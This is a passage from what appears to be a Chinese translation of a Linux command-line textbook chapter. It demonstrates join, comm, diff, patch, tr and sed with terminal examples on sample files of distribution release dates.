<th>ITEM</th>
</tr>
</thead>
<tbody><tr>
<td>John</td>
<td>Smith</td>
<td>1</td>
<td>Blue Widget</td>
</tr>
</tbody></table>
<p>为了演示 join 程序，我们需要制作一对具有共享键的文件。为此，我们将使用我们的 distros-by-date.txt 文件。从这个文件中，我们将构造两个附加文件。一个包含发布日期（这将是我们这次演示的共享键）和发行名称，如下所示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cut</span> -f 1,1 distros-by-date.txt &gt; distros-names.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">paste</span> distros-dates.txt distros-names.txt &gt; distros-key-names.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">head</span> distros-key-names.txt</span><br><span class="line">11/25/2008 Fedora</span><br><span class="line">10/30/2008 Ubuntu</span><br><span class="line">06/19/2008 SUSE</span><br><span class="line">05/13/2008 Fedora</span><br><span class="line">04/24/2008 Ubuntu</span><br><span class="line">11/08/2007 Fedora</span><br><span class="line">10/18/2007 Ubuntu</span><br><span class="line">10/04/2007 SUSE</span><br><span class="line">05/31/2007 Fedora</span><br><span class="line">04/19/2007 Ubuntu</span><br></pre></td></tr></table></figure>

<p>第二个文件包含发布日期和版本号，如下所示：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cut</span> -f 2,2 distros-by-date.txt &gt; distros-vernums.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">paste</span> distros-dates.txt distros-vernums.txt &gt; distros-key-vernums.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">head</span> distros-key-vernums.txt</span><br><span class="line">11/25/2008 10</span><br><span class="line">10/30/2008 8.10</span><br><span class="line">06/19/2008 11.0</span><br><span class="line">05/13/2008 9</span><br><span class="line">04/24/2008 8.04</span><br><span class="line">11/08/2007 8</span><br><span class="line">10/18/2007 7.10</span><br><span class="line">10/04/2007 10.3</span><br><span class="line">05/31/2007 7</span><br><span class="line">04/19/2007 7.04</span><br></pre></td></tr></table></figure>

<p>我们现在有了两个具有共享键（“发布日期”字段）的文件。重要的是要指出，为了 join 能够正确工作，文件必须在键字段上进行排序。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">join</span> distros-key-names.txt distros-key-vernums.txt | <span class="built_in">head</span></span><br><span class="line">11/25/2008 Fedora 10</span><br><span class="line">10/30/2008 Ubuntu 8.10</span><br><span class="line">06/19/2008 SUSE 11.0</span><br><span class="line">05/13/2008 Fedora 9</span><br><span class="line">04/24/2008 Ubuntu 8.04</span><br><span class="line">11/08/2007 Fedora 8</span><br><span class="line">10/18/2007 Ubuntu 7.10</span><br><span class="line">10/04/2007 SUSE 10.3</span><br><span class="line">05/31/2007 Fedora 7</span><br><span class="line">04/19/2007 Ubuntu 7.04</span><br></pre></td></tr></table></figure>

<p>还要注意，默认情况下，join 使用空格作为输入字段分隔符和单个空格作为输出字段分隔符。可以通过指定选项来修改这种行为。详情请参见 join 手册页。</p>
<h3 id="比较文本"><a href="#比较文本" class="headerlink" title="比较文本"></a>比较文本</h3><p>比较文本文件的版本经常是非常有用的。对于系统管理员和软件开发人员来说，这尤其重要。例如，系统管理员可能需要比较现有配置文件与以前的版本，以诊断系统问题。同样，程序员经常需要看到随时间变化程序所做的更改。</p>
<h4 id="comm"><a href="#comm" class="headerlink" title="comm"></a>comm</h4><p>comm 程序比较两个文本文件，并显示它们各自独有的行和它们共有的行。为了演示，我们将使用 cat 创建两个几乎相同的文本文件。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> &gt; file1.txt</span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> &gt; file2.txt</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">e</span><br></pre></td></tr></table></figure>

<p>接下来，我们将使用 comm 比较这两个文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">comm</span> file1.txt file2.txt</span><br><span class="line">a</span><br><span class="line">        b</span><br><span class="line">        c</span><br><span class="line">        d</span><br><span class="line">    e</span><br></pre></td></tr></table></figure>

<p>如我们所见，comm 产生三列输出。第一列包含第一个文件参数独有的行，第二列包含第二个文件参数独有的行，第三列包含两个文件共有的行。comm 支持以 -<em>n</em> 的形式的选项，其中 <em>n</em> 可以是 1、2 或 3。使用这些选项时，可以指定要抑制的列。例如，如果我们只想输出两个文件共有的行，我们将抑制第一列和第二列的输出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">comm</span> -12 file1.txt file2.txt</span><br><span class="line">        b</span><br><span class="line">        c</span><br><span class="line">        d</span><br></pre></td></tr></table></figure>

<h4 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h4><p>像 comm 程序一样，diff 用于检测文件之间的差异。然而，diff 是一个更复杂的工具，支持多种输出格式，并且能够一次处理大量文本文件。diff 经常被软件开发人员用来检查程序源代码不同版本之间的变化，因此它能够递归地检查源代码目录，这些目录经常被称为<em>源代码树</em>。diff 的一个常见用途是创建<em>diff 文件</em>或<em>补丁</em>，这些补丁被诸如 patch（我们很快就会讨论）之类的程序使用，以将一个文件（或多个文件）的一个版本转换为另一个版本。</p>
<p>如果我们使用 diff 来查看我们之前的示例文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ diff file1.txt file2.txt</span><br><span class="line">1d0</span><br><span class="line">&lt; a</span><br><span class="line">4a4</span><br><span class="line">&gt; e</span><br></pre></td></tr></table></figure>

<p>我们看到它的默认输出风格：两个文件之间差异的简洁描述。在默认格式中，每组变化前都有一个<em>变更命令</em>，以 <em>范围</em> <em>操作</em> <em>范围</em> 的形式描述将第一个文件转换为第二个文件所需的位置和变化类型，如表 20-4 所示。</p>
<p><em>表 20-4:</em> <em>diff 变更命令</em></p>
<table>
<thead>
<tr>
<th><strong>变更</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><em>r1</em>a<em>r2</em></td>
<td>在第二个文件的位置 <em>r2</em> 处添加行到第一个文件的位置 <em>r1</em>。</td>
</tr>
<tr>
<td><em>r1</em>c<em>r2</em></td>
<td>用第二个文件位置 <em>r2</em> 处的行替换（更改）第一个文件位置 <em>r1</em> 处的行。</td>
</tr>
<tr>
<td><em>r1</em>d<em>r2</em></td>
<td>删除第一个文件位置 <em>r1</em> 处的行，这些行在第二个文件的范围 <em>r2</em> 中出现</td>
</tr>
</tbody></table>
<p>在这种格式中，范围是起始行和结束行的逗号分隔列表。虽然这是默认格式（主要是为了符合 POSIX 兼容性和与传统 Unix 版本的 diff 向后兼容），但它不像其他可选格式那样广泛使用。两种更受欢迎的格式是<em>上下文格式</em>和<em>统一格式</em>。</p>
<p>使用上下文格式查看时（-c 选项），我们会看到这样的内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ diff -c file1.txt file2.txt</span><br><span class="line">*** file1.txt 2008-12-23 06:40:13.000000000 -0500</span><br><span class="line">--- file2.txt 2008-12-23 06:40:34.000000000 -0500</span><br><span class="line">***************</span><br><span class="line">*** 1,4 ****</span><br><span class="line">- a</span><br><span class="line"> b</span><br><span class="line"> c</span><br><span class="line"> d</span><br><span class="line">--- 1,4 ----</span><br><span class="line"> b</span><br><span class="line"> c</span><br><span class="line"> d</span><br><span class="line">+ e</span><br></pre></td></tr></table></figure>

<p>输出开始于两个文件及其时间戳的名称。第一个文件用星号标记，第二个文件用破折号标记。在余下的列表中，这些标记将表示它们各自的文件。接下来，我们看到变更组，包括默认数量的上下文行。在第一组中，我们看到这样的内容：</p>
<p><code>*** 1,4 ***</code></p>
<p>这表示第一个文件中的第 1 行到第 4 行。后来我们看到这样的内容：</p>
<p><code>--- 1,4 ---</code></p>
<p>这表示第二个文件中的第 1 行到第 4 行。在一个变更组内，行以表 20-5 中显示的四个指示器之一开始。</p>
<p><em>表 20-5:</em> <em>diff 上下文格式变更指示器</em></p>
<table>
<thead>
<tr>
<th><strong>指示器</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>空白</td>
<td>用于上下文显示的行。它不表明两个文件之间的差异。</td>
</tr>
<tr>
<td>-</td>
<td>已删除的行。这行在第一个文件中出现，但在第二个文件中没有。</td>
</tr>
<tr>
<td>+</td>
<td>添加的行。这行在第二个文件中出现，但在第一个文件中没有。</td>
</tr>
<tr>
<td>!</td>
<td>已更改的行。两个版本的行将分别在变更组的相应部分显示。</td>
</tr>
</tbody></table>
<p>统一格式类似于上下文格式，但更简洁。它用 -u 选项指定。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ diff -u file1.txt file2.txt</span><br><span class="line">--- file1.txt 2008-12-23 06:40:13.000000000 -0500</span><br><span class="line">+++ file2.txt 2008-12-23 06:40:34.000000000 -0500</span><br><span class="line">@@ -1,4 +1,4 @@</span><br><span class="line">-a</span><br><span class="line"> b</span><br><span class="line"> c</span><br><span class="line"> d</span><br><span class="line">+e</span><br></pre></td></tr></table></figure>

<p>上下文格式和统一格式之间最显著的区别是消除了重复的上下文行，使统一格式的结果比上下文格式的结果短。在我们之前的示例中，我们看到像上下文格式那样的文件时间戳，接着是字符串 @@ -1,4 +1,4 @@。这表示在变更组中描述的第一个文件和第二个文件的行。接下来是行本身，包括默认的三行上下文。每行以表 20-6 中列出的三个可能字符之一开始。</p>
<p><em>表 20-6:</em> <em>diff 统一格式变更指示器</em></p>
<table>
<thead>
<tr>
<th><strong>字符</strong></th>
<th><strong>含义</strong></th>
</tr>
</thead>
<tbody><tr>
<td>空白</td>
<td>这行由两个文件共享。</td>
</tr>
<tr>
<td>-</td>
<td>这行从第一个文件中移除。</td>
</tr>
<tr>
<td>+</td>
<td>这行被添加到第一个文件中。</td>
</tr>
</tbody></table>
<h4 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h4><p>patch 程序用于对文本文件应用更改。它接受来自 diff 的输出，通常用于将旧版本文件转换为新版本。让我们考虑一个著名的示例。Linux 内核是由一个庞大、松散组织的贡献者团队开发的，他们提交了一连串小的源代码更改。Linux 内核由几百万行代码组成，而一次一个贡献者所做的更改相当小。对于贡献者来说，每次做出小更改时都向每个开发者发送整个内核源代码树是没有意义的。相反，提交一个 diff 文件。diff 文件包含从内核的上一个版本到包含贡献者更改的新版本的变更。接收者然后使用 patch 程序将更改应用于他自己的源代码树。使用 diff&#x2F;patch 提供两个显著优势。</p>
<ol>
<li>diff 文件小，与源代码树的完整大小相比。</li>
<li>diff 文件简洁地显示了正在进行的更改，允许补丁的审阅者快速评估它。</li>
</ol>
<p>当然，diff&#x2F;patch 不仅适用于源代码文件，也适用于任何文本文件，如配置文件或任何其他文本。</p>
<p>为了准备与 patch 一起使用的 diff 文件，GNU 文档（见下面的进一步阅读）建议如下使用 diff：</p>
<blockquote>
<p>diff -Naur <em>old_file</em> <em>new_file</em> &gt; <em>diff_file</em></p>
</blockquote>
<p>其中 <em>old_file</em> 和 <em>new_file</em> 要么是单个文件，要么是包含文件的目录。r 选项支持目录树的递归。</p>
<p>一旦创建了 diff 文件，我们就可以应用它来将旧文件修补为新文件。</p>
<blockquote>
<p>patch &lt; <em>diff_file</em></p>
</blockquote>
<p>我们将通过我们的测试文件来演示。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ diff -Naur file1.txt file2.txt &gt; patchfile.txt</span><br><span class="line">[me@linuxbox ~]$ patch &lt; patchfile.txt</span><br><span class="line">patching file file1.txt</span><br><span class="line">[me@linuxbox ~]$ <span class="built_in">cat</span> file1.txt</span><br><span class="line">b</span><br><span class="line">c</span><br><span class="line">d</span><br><span class="line">e</span><br></pre></td></tr></table></figure>

<p>在这个示例中，我们创建了一个名为 patchfile.txt 的 diff 文件，然后使用 patch 程序应用了补丁。注意，我们不必指定要修补的目标文件，因为 diff 文件（以统一格式）已经在头部包含了文件名。一旦应用了补丁，我们可以看到 file1.txt 现在与 file2.txt 匹配。</p>
<p>patch 有大量的选项，还有其他一些实用程序可以用来分析和编辑补丁。</p>
<h3 id="即时编辑"><a href="#即时编辑" class="headerlink" title="即时编辑"></a>即时编辑</h3><p>我们对文本编辑器的体验主要是<em>交互式</em>的，意味着我们手动移动光标然后输入我们的更改。然而，还有<em>非交互式</em>的文本编辑方式。例如，有可能使用单个命令对多个文件应用一套更改。</p>
<h4 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h4><p>tr 程序用于<em>转换</em>字符。我们可以将其视为一种基于字符的查找和替换操作。转换是将一个字母表中的字符更改为另一个字母表中的字符的过程。例如，将字符从小写转换为大写就是转换。我们可以如下使用 tr 来执行这样的转换：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;lowercase letters&quot;</span> | <span class="built_in">tr</span> a-z A-Z</span><br><span class="line">LOWERCASE LETTERS</span><br></pre></td></tr></table></figure>

<p>如我们所见，tr 操作标准输入，并在标准输出上输出其结果。tr 接受两个参数：要转换的一组字符和相应的要转换成的一组字符。字符集可以以三种方式之一表示。</p>
<ol>
<li>枚举列表。例如，ABCDEFGHIJKLMNOPQRSTUVWXYZ</li>
<li>字符范围。例如，A-Z。注意，这种方法有时会因为区域设置的排序顺序而出现问题，因此应谨慎使用。</li>
<li>POSIX 字符类。例如，[:upper:]。</li>
</ol>
<p>在大多数情况下，两个字符集应该等长；然而，如果我们想将多个字符转换为单个字符，第一个集合可以比第二个大。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;lowercase letters&quot;</span> | <span class="built_in">tr</span> [:lower:] A</span><br><span class="line">AAAAAAAAA AAAAAAA</span><br></pre></td></tr></table></figure>

<p>除了转换外，tr 还允许从输入流中简单地删除字符。在本章早些时候，我们讨论了将 MS-DOS 文本文件转换为 Unix 风格文本的问题。要执行此转换，需要从每行的末尾删除回车字符。这可以如下使用 tr 来执行：</p>
<blockquote>
<p>tr -d ‘\r’ &lt; *dos_file* &gt; <em>unix_file</em></p>
</blockquote>
<p>其中 <em>dos_file</em> 是要转换的文件，<em>unix_file</em> 是结果。此命令形式使用转义序列 \r 来表示回车字符。要查看 tr 支持的序列和字符类的完整列表，请尝试以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">tr</span> --<span class="built_in">help</span></span><br></pre></td></tr></table></figure>

<p><strong>ROT13：不那么秘密的解码器</strong></p>
<p>tr 的一个有趣用途是执行文本的 <em>ROT13 编码</em>。ROT13 是基于简单替换密码的一种琐碎加密类型。称 ROT13 为“加密”是在宽容；“文本混淆”更准确。有时在文本上使用它是为了掩盖潜在的冒犯内容。该方法简单地将每个字符上移字母表中的 13 个位置。由于这是可能的 26 个字符的一半，对文本执行第二次算法会将其恢复到原始形式。使用以下命令与 tr 执行此编码：</p>
<blockquote>
<p><strong>echo “secret text” | tr a-zA-Z n-za-mN-ZA-M</strong></p>
</blockquote>
<p>frperg grkg</p>
<p>第二次执行相同程序会得到以下翻译：</p>
<blockquote>
<p><strong>echo “frperg grkg” | tr a-zA-Z n-za-mN-ZA-M</strong></p>
</blockquote>
<p>secret text</p>
<p>许多电子邮件程序和 Usenet 新闻阅读器支持 ROT13 编码。Wikipedia 包含关于该主题的好文章：<span class="exturl" data-url="aHR0cDovL2VuLndpa2lwZWRpYS5vcmcvd2lraS9ST1QxMw==">http://en.wikipedia.org/wiki/ROT13<i class="fa fa-external-link-alt"></i></span></p>
<p>tr 还可以执行另一个技巧。使用 -s 选项，tr 可以“挤压”（删除）重复出现的字符。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;aaabbbccc&quot;</span> | <span class="built_in">tr</span> -s ab</span><br><span class="line">abccc</span><br></pre></td></tr></table></figure>

<p>这里我们有一个包含重复字符的字符串。通过指定集合“ab”给 tr，我们消除了集合中</p>
<p>字母的重复实例，同时保留未出现在集合中的字符（“c”）不变。注意，重复的字符必须是相邻的。如果不是，挤压将不会生效。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;abcabcabc&quot;</span> | <span class="built_in">tr</span> -s ab</span><br><span class="line">abcabcabc</span><br></pre></td></tr></table></figure>

<h4 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h4><p>sed 的名称代表 <em>流编辑器</em>。它对文本流进行文本编辑，可以是一组指定的文件或标准输入。sed 是一个强大且有些复杂的程序（有关它的完整书籍），因此我们在这里不会完全涵盖它。</p>
<p>一般来说，sed 的工作方式是给它一个单个编辑命令（在命令行上）或一个包含多个命令的脚本文件的名称，然后它在文本流的每一行上执行这些命令。这里是一个 sed 动作的简单示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;front&quot;</span> | sed <span class="string">&#x27;s/front/back/&#x27;</span></span><br><span class="line">back</span><br></pre></td></tr></table></figure>

<p>在此示例中，我们使用 echo 产生一个单词流并将其通过管道输送给 sed。sed 反过来，在流中的文本上执行指令 s&#x2F;front&#x2F;back&#x2F; 并产生“back”作为结果。我们也可以识别这个命令，类似于 vi 中的“替换”（搜索并替换）命令。</p>
<p>sed 命令以单个字母开始。在前面的示例中，替换命令由字母 s 表示，并跟随搜索和替换字符串，用斜杠字符作为分隔符。分隔符字符的选择是任意的。按照惯例，经常使用斜杠字符，但 sed 将接受紧跟在命令后的任何字符作为分隔符。我们可以这样执行相同的命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;front&quot;</span> | sed <span class="string">&#x27;s_front_back_&#x27;</span></span><br><span class="line">back</span><br></pre></td></tr></table></figure>

<p>通过在命令后立即使用下划线字符，它成为分隔符。设置分隔符的能力可用于使命令更易读，正如我们将看到的。</p>
<p>大多数 sed 命令可能会被 <em>地址</em> 前置，这用于指定哪些输入流的行将被编辑。如果省略地址，则编辑命令在输入流的每一行上执行。地址的最简单形式是行号。我们可以在我们的示例中添加一个地址。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;front&quot;</span> | sed <span class="string">&#x27;1s/front/back/&#x27;</span></span><br><span class="line">back</span><br></pre></td></tr></table></figure>

<p>在我们的命令中添加地址 1 会导致我们的替换在我们一行输入流的第一行上执行。如果我们指定另一个数字，我们会看到编辑未执行，因为我们的输入流没有第二行。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;front&quot;</span> | sed <span class="string">&#x27;2s/front/back/&#x27;</span></span><br><span class="line">front</span><br></pre></td></tr></table></figure>

<p>地址可以以多种方式表示。表 20-7 列出了最常见的形式。</p>
<p><em>表 20-7:</em> <em>sed 地址表示法</em></p>
<table>
<thead>
<tr>
<th><strong>地址</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><em>n</em></td>
<td>行号，其中 <em>n</em> 是一个正整数。</td>
</tr>
<tr>
<td>$</td>
<td>最后一行。</td>
</tr>
<tr>
<td>&#x2F;<em>regexp</em>&#x2F;</td>
<td>匹配 POSIX 基本正则表达式的行。注意正则表达式由斜杠字符分隔。可选地，正则表达式可以由替代字符分隔，通过指定表达式 *cregexpc*，其中 <em>c</em> 是替代字符。</td>
</tr>
<tr>
<td><em>addr1</em>,<em>addr2</em></td>
<td>从 <em>addr1</em> 到 <em>addr2</em> 的范围内的行，包含两者。地址可以是前面列出的任何单个地址形式。</td>
</tr>
<tr>
<td><em>first</em>~<em>step</em></td>
<td>匹配由数字 <em>first</em> 表示的行，然后是每隔 <em>step</em> 间隔的每个后续行。例如，1<del>2 指的是每个奇数行，5</del>5 指的是第五行以及之后每隔五行的行。</td>
</tr>
<tr>
<td><em>addr1</em>,+n</td>
<td>匹配 <em>addr1</em> 和随后的 <em>n</em> 行。</td>
</tr>
<tr>
<td><em>addr</em>!</td>
<td>匹配除 <em>addr</em> 之外的所有行，<em>addr</em> 可以是前面列出的任何形式。</td>
</tr>
</tbody></table>
<p>我们将使用本章前面的 distros.txt 文件演示不同类型的地址。首先，这里是一系列行号：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sed -n <span class="string">&#x27;1,5p&#x27;</span> distros.txt</span><br><span class="line">SUSE 10.2 12/07/2006</span><br><span class="line">Fedora 10 11/25/2008</span><br><span class="line">SUSE 11.0 06/19/2008</span><br><span class="line">Ubuntu 8.04 04/24/2008</span><br><span class="line">Fedora 8 11/08/2007</span><br></pre></td></tr></table></figure>

<p>在此示例中，我们打印从第 1 行开始到第 5 行的一系列行。为此，我们使用 p 命令，它简单地导致匹配行被打印。然而，要使其有效，我们必须包含选项 -n（“不自动打印”选项）以使 sed 不默认打印每一行。</p>
<p>接下来，我们将尝试一个正则表达式。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sed -n <span class="string">&#x27;/SUSE/p&#x27;</span> distros.txt</span><br><span class="line">SUSE 10.2 12/07/2006</span><br><span class="line">SUSE 11.0 06/19/2008</span><br><span class="line">SUSE 10.3 10/04/2007</span><br><span class="line">SUSE 10.1 05/11/2006</span><br></pre></td></tr></table></figure>

<p>通过包含斜杠分隔的正则表达式 &#x2F;SUSE&#x2F;，我们能够以与 grep 类似的方式隔离包含它的行。</p>
<p>最后，我们将尝试通过在地址后添加感叹号 (!) 来进行否定。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sed -n <span class="string">&#x27;/SUSE/!p&#x27;</span> distros.txt</span><br><span class="line">Fedora 10 11/25/2008</span><br><span class="line">Ubuntu 8.04 04/24/2008</span><br><span class="line">Fedora 8 11/08/2007</span><br><span class="line">Ubuntu 6.10 10/26/2006</span><br><span class="line">Fedora 7 05/31/2007</span><br><span class="line">Ubuntu 7.10 10/18/2007</span><br><span class="line">Ubuntu 7.04 04/19/2007</span><br><span class="line">Fedora 6 10/24/2006</span><br><span class="line">Fedora 9 05/13/2008</span><br><span class="line">Ubuntu 6.06 06/01/2006</span><br><span class="line">Ubuntu 8.10 10/30/2008</span><br><span class="line">Fedora 5 03/20/2006</span><br></pre></td></tr></table></figure>

<p>这里我们看到了预期的结果：文件中除了与正则表达式匹配的行之外的所有行。</p>
<p>到目前为止，我们已经看过两个 sed 编辑命令，s 和 p。表 20-8 提供了更完整的基本编辑命令列表。</p>
<p><em>表 20-8:</em> <em>sed 基本编辑命令</em></p>
<table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td>&#x3D;</td>
<td>输出当前行号。</td>
</tr>
<tr>
<td>a</td>
<td>在当前行之后追加文本。</td>
</tr>
<tr>
<td>d</td>
<td>删除当前行。</td>
</tr>
<tr>
<td>i</td>
<td>在当前行前插入文本。</td>
</tr>
<tr>
<td>p</td>
<td>打印当前行。默认情况下，sed 打印每一行，并且只编辑文件中指定地址的行。通过指定 -n 选项可以覆盖默认行为。</td>
</tr>
<tr>
<td>q</td>
<td>退出 sed，不再处理更多行。如果没有指定 -n 选项，输出当前行。</td>
</tr>
<tr>
<td>Q</td>
<td>退出 sed，不再处理更多行。</td>
</tr>
<tr>
<td>s&#x2F;<em>regexp</em>&#x2F;<em>replacement</em>&#x2F;</td>
<td>在找到 <em>regexp</em> 的地方用 <em>replacement</em> 的内容替换。<em>replacement</em> 可以包含特殊字符 &amp;，等同于匹配 <em>regexp</em> 的文本。此外，<em>replacement</em> 可以包含序列 \1 到 \9，这是 <em>regexp</em> 中相应子表达式的内容。关于这个的更多信息，见下面的<em>反向引用</em>讨论。在 <em>replacement</em> 后面的尾随斜杠后，可以指定一个可选标志来修改 s 命令的行为。</td>
</tr>
<tr>
<td>y&#x2F;<em>set1</em>&#x2F;<em>set2</em></td>
<td>通过将 <em>set1</em> 中的字符转换为 <em>set2</em> 中的相应字符来执行转换。注意与 tr 不同，sed 要求两个集合等长。</td>
</tr>
</tbody></table>
<p>s 命令是迄今为止最常用的编辑命令。我们将通过在我们的 distros.txt 文件上执行编辑来演示它的一些功能。我们之前讨论了 distros.txt 中的日期字段不是以“计算机友好”格式排列的。虽然日期格式为 MM&#x2F;DD&#x2F;YYYY，但如果格式为 YYYY-MM-DD（为了便于排序）会更好。手动对文件进行此更改既耗时又容易出错，但使用 sed，这种更改可以一步完成。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ sed <span class="string">&#x27;s/\([0-9]\&#123;2\&#125;\)\/\([0-9]\&#123;2\&#125;\)\/\([0-9]\&#123;4\&#125;\)$/\3-\1-\2/&#x27;</span> distros.txt</span><br><span class="line">SUSE 10.2 2006-12-07</span><br><span class="line">Fedora 10 2008-11-25</span><br><span class="line">SUSE 11.0 2008-06-19</span><br><span class="line">Ubuntu 8.04 2008-04-24</span><br><span class="line">Fedora 8 2007-11-08</span><br><span class="line">SUSE 10.3 2007-10-04</span><br><span class="line">Ubuntu 6.10 2006-10-26</span><br><span class="line">Fedora 7 2007-05-31</span><br><span class="line">Ubuntu 7.10 2007-10-18</span><br><span class="line">Ubuntu 7.04 2007-04-19</span><br><span class="line">SUSE 10.1 2006-05-11</span><br><span class="line">Fedora 6 2006-10-24</span><br><span class="line">Fedora 9 2008-05-13</span><br><span class="line">Ubuntu 6.06 2006-06-01</span><br><span class="line">Ubuntu 8.10 2008-10-30</span><br><span class="line">Fedora 5 2006-03-20</span><br></pre></td></tr></table></figure>

<p>哇！这是一个看起来很复杂的命令。但它有效。仅一步，我们就改变了文件中的日期格式。这也是为什么正则表达式有时被戏称为“只写”媒介的一个完美例子。我们可以写它们，但有时我们无法读懂它们。在我们被这个命令吓跑之前，让我们看看它是如何构建的。首先，我们知道命令将具有这种基本结构。</p>
<blockquote>
<p><strong>sed ‘s&#x2F;regexp&#x2F;replacement&#x2F;‘ distros.txt</strong></p>
</blockquote>
<p>我们的下一步是找出一个正则表达式，它将隔离日期。因为它以 MM&#x2F;DD&#x2F;YYYY 格式出现并且位于行尾，我们可以使用这样的表达式：</p>
<blockquote>
<p><strong>[0-9]{2}&#x2F;[0-9]{2}&#x2F;[0-9]{4}$</strong></p>
</blockquote>
<p>这匹配两个数字、一个斜杠、两个数字、一个斜杠、四个数字和行尾。所以这就解决了 <em>regexp</em>，但 <em>replacement</em> 呢？为了处理这个，我们必须引入 BRE 中某些应用程序出现的新正则表达式特性。这个特性叫做<em>反向引用</em>，其工作原理如下：如果在 <em>replacement</em> 中出现序列 *n*，其中 <em>n</em> 是 1 到 9 之间的数字，该序列将引用前面正则表达式中的相应子表达式。要创建子表达式，我们只需这样用括号括起来：</p>
<blockquote>
<p><strong>([0-9]{2})&#x2F;([0-9]{2})&#x2F;([0-9]{4})$</strong></p>
</blockquote>
<p>我们现在有了三个子表达式。第一个包含月份，第二个包含月份的日子，第三个包含年份。现在我们可以这样构造 <em>replacement</em>：</p>
<blockquote>
<p><strong>\3-\1-\2</strong></p>
</blockquote>
<p>这给我们年份、一个破折号、月份、一个破折号和日子。</p>
<p>现在，我们的命令看起来像这样：</p>
<blockquote>
<p><strong>sed ‘s&#x2F;([0-9]{2})&#x2F;([0-9]{2})&#x2F;([0-9]{4})$&#x2F;\3-\1-\2&#x2F;‘ distros.txt</strong></p>
</blockquote>
<p>我们还有两个剩余问题。第一个是我们的正则表达式中额外的斜杠会在 sed 尝试解释 s 命令时造成混淆。第二个是由于 sed 默认只接受基本正则表达式，我们正则表达式中的几个字符将被视为字面量，而不是元字符。我们可以通过大量使用反斜杠来转义冒犯字符来解决这两个问题。</p>
<blockquote>
<p><strong>sed ‘s&#x2F;([0-9]{2})&#x2F;([0-9]{2})&#x2F;([0-9]{4})$&#x2F;\3-\1-\2&#x2F;‘ distros.txt</strong></p>
</blockquote>
<p>就是这样！</p>
<p>s 命令的另一个特性是在替换字符串后面可以使用可选标志。其中最重要的是 g 标志，它指示 sed 对一行应用全局搜索和替换，而不仅仅是第一个实例，这是默认行为。这里是一个示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;aaabbbccc&quot;</span> | sed <span class="string">&#x27;s/b/B/&#x27;</span></span><br><span class="line">aaaBbbccc</span><br></pre></td></tr></table></figure>

<p>我们看到替换执行了，但只对字母 b 的第一个实例，而剩余的实例保持不变。通过添加 g 标志，我们能够更改所有的实例。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[me@linuxbox ~]$ <span class="built_in">echo</span> <span class="string">&quot;aaabbbccc&quot;</span> | sed <span class="string">&#x27;s/b/B/g&#x27;</span></span><br><span class="line">aaaBBBccc</span><br></pre></td></tr></table></figure>

